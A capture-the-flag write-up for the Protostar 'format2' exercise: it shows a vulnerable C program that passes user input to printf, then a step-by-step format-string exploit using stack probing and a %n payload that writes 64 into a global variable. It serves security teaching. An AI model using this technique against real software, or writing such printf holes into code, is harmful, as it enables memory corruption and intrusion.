# Protostar - Format 2

### About ###

>This level moves on from format1 and shows how specific values can be written in memory.
>
>This level is at `/opt/protostar/bin/format2`

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### Solution 

This challenge is almost the same as the previous one, but this time we are going to write a specific value in the variable `target`.

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/format2 | grep target
080496e4 g     O .bss  	00000004              target
```

First we need to find where our format string is in the stack.

```
user@protostar:/tmp$ for i in $(seq 1 5); do echo $i; python -c "print 'ABCDEFGHIJKLMNOP.%$i\$x'" | format2; echo; done;
1
EFGHIJKLMNOP.200
target is 0 :(

2
EFGHIJKLMNOP.b7fd8420
target is 0 :(

3
EFGHIJKLMNOP.bffff4f4
target is 0 :(

4
EFGHIJKLMNOP.44434241  <--- Our pattern
target is 0 :(

5
EFGHIJKLMNOP.48474645
target is 0 :(
```

It is the fourth value on the stack. We can already write something in `target`.

```
user@protostar:/tmp$ python -c "print '\xe4\x96\x04\x08EFGHIJKLMNOP.%4\$n'" | format2
EFGHIJKLMNOP.
target is 17 :(
```

Now we need to have exactly 64 characters before `%4$n` is used. `\xe4\x96\x04\x08EFGHIJKLMNOP.` is already 17 characters, like the program already told us. We still need `64 - 17 = 47` characters. We can use the technique from `format0` to write a specific number of whitespaces `%NUMc` where `NUM` is the number of whitespaces we want to write.

And that's how we can write 64 into `target`.

```
user@protostar:/tmp$ python -c "print '\xe4\x96\x04\x08EFGHIJKLMNOP.%47c%4\$n'" | format2
EFGHIJKLMNOP.
you have modified the target :)
```


